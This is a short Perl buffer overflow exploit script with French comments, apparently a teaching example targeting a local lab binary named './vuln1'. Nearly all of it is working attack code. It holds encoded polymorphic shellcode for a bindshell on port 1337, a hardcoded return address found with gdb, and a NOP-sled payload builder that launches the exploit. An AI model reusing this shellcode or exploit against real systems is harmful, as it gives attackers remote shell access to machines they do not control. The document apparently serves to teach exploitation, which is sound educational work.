#!/usr/bin/perl

# - sploit.pl
# - exploit très simpliste illustrant l'exploitation de buffer overflow.
# - local exploit
# - Linux
# - Bindshell polymorphique sur le port 1337

$shellcode =

	"\xeb\x06\x5d\x40\xeb\x07\x51\x59\xe8\xf5\xff\xff\xff\x49\x41" .
	"\xfd\x83\xc5\x26\x26\x89\xef\x4a\x42\x31\xc9\xb1\x5c\x31\xdb" .
	"\xb3\xfe\x48\x40\x89\xee\x48\x40\xfc\x8a\x06\x46\x30\xd8\xfe" .
	"\xc3\xaa\x89\xd2\xe2\xf4" .
	"\xcf\x3f\x99\xb1\x64\x51\x46\x57\x44\x55\x81\xe8\x60\x0a\x57" .
	"\xc0\x8e\x86\xd7\x88\x40\x75\x7c\x10\x2f\x54\x7e\x4a\x93\xfa" .
	"\x76\x0d\x4f\x4f\xa9\xc0\x92\x45\xe9\xa5\x96\x41\x9b\x2d\xe7" .
	"\xab\x7c\x7a\xa7\xce\x73\x81\x54\xfe\xb4\x04\xff\x86\x3b\xaa" .
	"\x73\x8b\x03\xf0\xbe\xba\x89\x34\xb5\x72\x84\xf5\x4d\x16\x20" .
	"\x66\x65\x38\x24\x25\x61\x2d\x39\x3f\xdb\xb0\x05\x06\xdf\xb6" .
	"\x95\xd9";

# informations
	
$ret = 0xbffffb40;
# Mettre ici l'addr de retour. Nous avons pu la trouver grace
# gdb en faisant un info reg.

$buffer = 221;
# Nous avons pu voir que le segfault commencait a partir de 204
	
$oe = 10000;

$nops = "\x90";
# On spéficie les NOPs.
	
$offset = 0;
# l'offset est ici de 0.
	
if (@ARGV == 1)

        {
                $offset = $ARGV[0];
        }

$addr = pack('l', ($ret + $offset));
for ($i = 0; $i < $buffer; $i += 4)

        {
                $tamp .= $addr;
        }

for ($i = 0; $i < ($oe - length($shellcode) - 100); $i++)

        {
               $tamp .= $nops;
        }

$tamp .= $shellcode;
exec("./vuln1", $tamp,0);